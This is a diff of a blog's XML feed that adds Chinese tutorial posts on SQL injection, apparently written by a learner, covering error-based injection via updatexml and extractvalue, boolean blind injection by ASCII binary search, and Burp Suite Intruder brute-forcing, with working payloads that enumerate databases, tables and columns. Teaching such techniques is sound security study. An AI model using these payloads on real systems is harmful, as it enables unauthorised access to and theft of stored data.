@@ -4,6 +4,56 @@
   
     
     <entry>
+      <title>SQL报错注入</title>
+      <link href="/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
+      <url>/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在公司开发项目是通常程序开发期间需要告诉使用者某些报错信息，方便程序员进行调试修复，定位文件错误，而且开发中会经常使用异常处理函数，捕获错误信息，比如在PHP中使用mysql_error()函数。如果SQL注入存在时，会有报错信息返回就可以采用报错注入进行攻击啦！！！</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>报错注入嘛，首先肯定要让它报错呀。<br>那么什么时候才会报错呢？</p><pre><code>Xpath语法错误     extractvalue(1,(concat(0x7e,(payload),0x7e)))     updatexml(1,(concat(0x7e,(payload),0x7e)))     0x7e这个十六进制数代表符号~，~这个符号在xpath语法中是不存在的，因此总能报错     详细的使用方法请自行查找数据溢出错误     exp(x)     当参数x超过710时，exp()函数会报错主键重复错误     floor(x)：     count()和group by遇到rand()产生的重复值时报错函数特性报错     使用name_const来制造一个列     mysql列名重复会报错参数类型报错(不写了，自己找去)</code></pre><p>现在有了报错，怎么利用？<br>忘记了那个and和or语句了吗？<br>把SQL语句放到产生报错的语句中，<br>再将原本要传入的参数和上面已经结合起来的语句用and合为payload。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h5><pre><code>?id=1&#39; -- a</code></pre><p>老一套了，直接拿来用。</p><h5 id="判断是否是报错注入"><a href="#判断是否是报错注入" class="headerlink" title="判断是否是报错注入"></a>判断是否是报错注入</h5><pre><code>?id=1&#39; and updatexml(1,&#39;~&#39;,3) -- a</code></pre><p>如果报错了那说明是的，这里可以多换几个函数。<br>要让前面一半正常执行！</p><h5 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h5><pre><code>?id=-1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(schema_name)        from information_schema.schemata)    , 1 , 31)),3) -- a</code></pre><p>一样的，函数自己换<br>但是注意高版本数据库基本上都没有这个漏洞了<br>尽管这样，一旦有漏洞就能用这个库跑了</p><h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(table_name)        from information_schema.tables        where table_schema = &#39;库名&#39;)    , 1 , 31)),3) -- a</code></pre><h5 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(column_name)        from information_schema.columns        where table_schema = &#39;库名&#39; and table_name = &#39;表名&#39;)    , 1 , 31)),3) -- a</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日报 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 日报 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL布尔盲注(延时注入后面再写)</title>
+      <link href="/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
+      <url>/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
+      
+        <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。<br>或者为真时返回正常页面，为假时跳转到其它页面等。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在后端的PHP代码中，对你传入的数据进行了处理并判断<br>判断是True或False会执行不同代码</p><h4 id="开始注入-二分法"><a href="#开始注入-二分法" class="headerlink" title="开始注入(二分法)"></a>开始注入(二分法)</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>使用一些判断真假的语句来进行判定<br>当它是数字型时:</p><pre><code>1&#39; and 1=0 --+1&#39; and 1=1 --+</code></pre><p>如果第一个与第二个回显不一样那么可能是布尔盲注<br>但是不排除有些丧心病狂的扑街预判了你的预判<br>这时候修改为不常见的数值（如1352=1352等）</p><p>当它是字符串型注入时:</p><pre><code>1&#39; and &#39;1&#39;=&#39;114514 --+1&#39; and &#39;1&#39;=&#39;666 --+</code></pre><h5 id="猜数据库名长度"><a href="#猜数据库名长度" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h5><p>这个应该很好理解吧，既然它不告诉你有啥，那你就自己猜咯。<br>刚刚好又有and可以判断语句，是不是天无绝人之路？</p><pre><code>1&#39; and (length(database()))&gt;x--+</code></pre><p>当报错的时候就说明数据库名字长度是x-1了嘛</p><h5 id="猜数据库名（ASCII码）"><a href="#猜数据库名（ASCII码）" class="headerlink" title="猜数据库名（ASCII码）"></a>猜数据库名（ASCII码）</h5><pre><code>1&#39; and ascii(substr(database(),1,1))&gt;100--+1&#39; and ascii(substr(database(),1,1))&lt;150--+</code></pre><p>这样子一直用二分法来缩小数据库名的ASCII码范围直到求出最终值。<br>是不是很麻烦？是就对了！<br>现在是告诉你注入原理，不看就滚犊子。</p><h5 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h5><pre><code>1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100--+1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;150--+</code></pre><p>方法其实是和前面的联合查询注入一样的，多了个二分法而已<br>其实拿SQLmap和BP跑也是差不多的原理，只是自动化注入罢了</p><h5 id="猜字段名"><a href="#猜字段名" class="headerlink" title="猜字段名"></a>猜字段名</h5><pre><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&gt;50--+1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&lt;80--+</code></pre><p>还是一样的</p><h5 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h5><pre><code>1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&lt;80--+1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&gt;30--+</code></pre><p>仍然是一样的</p><h4 id="开始注入-字符判断法"><a href="#开始注入-字符判断法" class="headerlink" title="开始注入(字符判断法)"></a>开始注入(字符判断法)</h4><p>数据库名字长度的判断跟上面的的一样<br>对每一位猜解都要写很多次判断语句<br>判断这些字符数字</p><pre><code>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</code></pre><h4 id="使用Burp-Suite注入"><a href="#使用Burp-Suite注入" class="headerlink" title="使用Burp_Suite注入"></a>使用Burp_Suite注入</h4><p>由于手工进行一一判断，工作量较大，可使用Burp_Suite中的字典进行。<br>1、抓包并将数据包传送到intruder<br>2、对对应位置进行上面提到的字符数字爆破:</p><pre><code>http://192.168.162.128/?id=1&#39; and if(SUBSTRING(database(),$1$,1)=$d$,1,0)–+&amp;Submit=Submit#</code></pre><p>payload set中分别设置并开始attack:<br>number类型，从1到数据库名字长度，步长为1<br>simple list类型，导入字符数字的字典</p><p><em><strong>后面的同理，自己举一反三吧</strong></em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日报 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 日报 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL联合注入</title>
       <link href="/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
       <url>/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
@@ -33,7 +83,7 @@
       <link href="/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
       <url>/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
       
-        <content type="html"><![CDATA[<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>BurpSuite的及其拓展的安装及使用<br>SQLmap的下载及基本命令<br>了解少许PHP语言<br><strong>不断尝试的热情！</strong>                    </p><h4 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h4><h5 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h5><p>由于SQL语言是结构化查询语言(是操作数据库的语言,不懂的自己找我之前的文章)可以据库进行增、删、改、查等操作。<br>又因为程序员写的PHP代码不严谨，导致访问提交数据时，我们可以把代码提交到后台数据库，后台数据库处理这些数据时这些数据插入或拼接在一起形成了SQL语句命令，最后这个SQL语句可以被后台数据库作为恶意代码执行，从而达到你想达到的注入效果。</p><h5 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h5><p>按照注入时的表现来区分:<br>boolean-based blind – 布尔盲注<br>error-based – 报错注入<br>time-base blind – 延时注入<br>UNION query – 联合查询注入<br>堆叠查询注入</p><p>按照注入点区分:<br>字符型<br>数字型</p><p>按照提交数据方式来区分:<br>GET注入<br>POST注入<br>Cookie注入<br>HTTP头部注入</p><h5 id="注入测试一般流程"><a href="#注入测试一般流程" class="headerlink" title="注入测试一般流程"></a>注入测试一般流程</h5><pre><code>(1)寻找注入点:可通过web扫描工具实现；        是否存在注入并且判断注入类型(2)利用注入点:尝试通过注入获得各种信息，越多越好；(3)数据处理:猜解关键数据库表及其重要字段与内容；        猜解SQL查询语句的字段数        确定回显点        查询数据库信息        查询用户名，数据库名(4)后续攻击:通过获取的用户信息，寻找后台登录并利用后台或了解的进一步信息。        文件读取        写入shell</code></pre><h4 id="一些杂七杂八的拓展知识"><a href="#一些杂七杂八的拓展知识" class="headerlink" title="一些杂七杂八的拓展知识"></a>一些杂七杂八的拓展知识</h4><pre><code>在MySQL5.0版本以后MySQL数据库中会默认存放一个information_schema的数据库，在该数据库中，我们需要记住三个表名，分别是schemata，tables，columns。schemata表字段schema_name记录着数据库的库名；tables表字段table_schema和table_nmae分别记录着数据库中的库名和表名；columns表字段table_schema和table_name以及columns_name分别记录着数据库的库名、表名、字段名；select 原始查询内容 union select 构造的内容两者下一级的个数必须保持一致select * from order by 你要按照排序的对象对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1limit 一个一个打印出来group_concat 一次性全部打印group_concat()函数将同一组的列显示出来，相当于爆出该数据库的全部表concat_ws(分隔符，str1，str2，……)函数同时显示多个字段，并以分隔符分开concat(str1，str2，str3，…)函数同时显示多个字段，其中有一个字段为null，则返回nullSQL语句结尾加上limit 0,1表示一个一个输出前面的语句的结果0x20是空格常用函数:length()                # 返回字符串的长度substring()                        substr()                # 截取字符串mid()left()                    # 从左侧开始取指定字符个数的字符串concat()                    # 没有分隔符的连接字符串concat_ws()              # 含有分割符的连接字符串group_conat()           # 连接一个组的字符串ord()                    # 返回ASCII 码ascii()    hex()                    # 将字符串转换为十六进制unhex()                    # hex 的反向操作md5()                    # 返回MD5 值floor(x)                # 返回不大于x 的最大整数round()                    # 返回参数x 接近的整数rand()                    # 返回0-1 之间的随机浮点数load_file()                # 读取文件，并返回文件内容作为一个字符串sleep()                    # 睡眠时间为指定的秒数if(true,t,f)            # if 判断find_in_set()            # 返回字符串在字符串列表中的位置benchmark()                # 指定语句执行的次数</code></pre><h5 id="最后哔哔一句，如果你丫这都看不懂，那你别学了。"><a href="#最后哔哔一句，如果你丫这都看不懂，那你别学了。" class="headerlink" title="最后哔哔一句，如果你丫这都看不懂，那你别学了。"></a>最后哔哔一句，如果你丫这都看不懂，那你别学了。</h5>]]></content>
+        <content type="html"><![CDATA[<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>BurpSuite的及其拓展的安装及使用<br>SQLmap的下载及基本命令<br>了解少许PHP语言<br><strong>不断尝试的热情！</strong>                    </p><h4 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h4><h5 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h5><p>由于SQL语言是结构化查询语言(是操作数据库的语言,不懂的自己找我之前的文章)可以据库进行增、删、改、查等操作。<br>又因为程序员写的PHP代码不严谨，导致访问提交数据时，我们可以把代码提交到后台数据库，后台数据库处理这些数据时这些数据插入或拼接在一起形成了SQL语句命令，最后这个SQL语句可以被后台数据库作为恶意代码执行，从而达到你想达到的注入效果。</p><h5 id="SQL注入三要素"><a href="#SQL注入三要素" class="headerlink" title="SQL注入三要素"></a>SQL注入三要素</h5><p><em><strong>未严格过滤（没开waf等防护）<br>允许恶意修改（具有一定权限）<br>执行语句（能够闭合并执行的合法SQL语句）</strong></em></p><h5 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h5><p>按照注入时的表现来区分:<br>boolean-based blind – 布尔盲注<br>error-based – 报错注入<br>time-base blind – 延时注入<br>UNION query – 联合查询注入<br>堆叠查询注入</p><p>按照注入点区分:<br>字符型<br>数字型</p><p>按照提交数据方式来区分:<br>GET注入<br>POST注入<br>Cookie注入<br>HTTP头部注入</p><h5 id="注入测试一般流程"><a href="#注入测试一般流程" class="headerlink" title="注入测试一般流程"></a>注入测试一般流程</h5><pre><code>(1)寻找注入点:可通过web扫描工具实现；        是否存在注入并且判断注入类型(2)利用注入点:尝试通过注入获得各种信息，越多越好；(3)数据处理:猜解关键数据库表及其重要字段与内容；        猜解SQL查询语句的字段数        确定回显点        查询数据库信息        查询用户名，数据库名(4)后续攻击:通过获取的用户信息，寻找后台登录并利用后台或了解的进一步信息。        文件读取        写入shell</code></pre><h4 id="一些杂七杂八的拓展知识"><a href="#一些杂七杂八的拓展知识" class="headerlink" title="一些杂七杂八的拓展知识"></a>一些杂七杂八的拓展知识</h4><pre><code>在MySQL5.0版本以后MySQL数据库中会默认存放一个information_schema的数据库，在该数据库中，我们需要记住三个表名，分别是schemata，tables，columns。schemata表字段schema_name记录着数据库的库名；tables表字段table_schema和table_nmae分别记录着数据库中的库名和表名；columns表字段table_schema和table_name以及columns_name分别记录着数据库的库名、表名、字段名；select 原始查询内容 union select 构造的内容两者下一级的个数必须保持一致select * from order by 你要按照排序的对象对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1limit 一个一个打印出来group_concat 一次性全部打印group_concat()函数将同一组的列显示出来，相当于爆出该数据库的全部表concat_ws(分隔符，str1，str2，……)函数同时显示多个字段，并以分隔符分开concat(str1，str2，str3，…)函数同时显示多个字段，其中有一个字段为null，则返回nullSQL语句结尾加上limit 0,1表示一个一个输出前面的语句的结果0x20是空格常用函数:length()                # 返回字符串的长度substring()                        substr()                # 截取字符串mid()left()                    # 从左侧开始取指定字符个数的字符串concat()                    # 没有分隔符的连接字符串concat_ws()              # 含有分割符的连接字符串group_conat()           # 连接一个组的字符串ord()                    # 返回ASCII 码ascii()    hex()                    # 将字符串转换为十六进制unhex()                    # hex 的反向操作md5()                    # 返回MD5 值floor(x)                # 返回不大于x 的最大整数round()                    # 返回参数x 接近的整数rand()                    # 返回0-1 之间的随机浮点数load_file()                # 读取文件，并返回文件内容作为一个字符串sleep()                    # 睡眠时间为指定的秒数if(true,t,f)            # if 判断find_in_set()            # 返回字符串在字符串列表中的位置benchmark()                # 指定语句执行的次数</code></pre><h4 id="较难理解的注释语句"><a href="#较难理解的注释语句" class="headerlink" title="较难理解的注释语句"></a>较难理解的注释语句</h4><pre><code>#和-- 表示注释，可以使它们后面的语句不被执行(--后有个空格)get请求解释执行的时候，url中#号是锚点，所以HTTP请求中使用#闭合无法注释。而-- 在传输过程中--与后面的单引号连接在一起，也无法形成有效的mysql语句。那么要启动空格的作用就需要在--后面加上一点字符，比如+或&#39;(因为+会被解释成空格)当然，也可以使用--%20，把空格转换为urlencode编码格式，也不会报错。同理把#变成%23,也不报错。如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如在后台登录框中进行注入。另外#后面可以有空格，也可以没有(sql就是这么规定的，记住就行了)</code></pre><h5 id="最后哔哔一句，如果你丫这都看不懂，那你别学了。"><a href="#最后哔哔一句，如果你丫这都看不懂，那你别学了。" class="headerlink" title="最后哔哔一句，如果你丫这都看不懂，那你别学了。"></a>最后哔哔一句，如果你丫这都看不懂，那你别学了。</h5>]]></content>
       
       
       <categories>
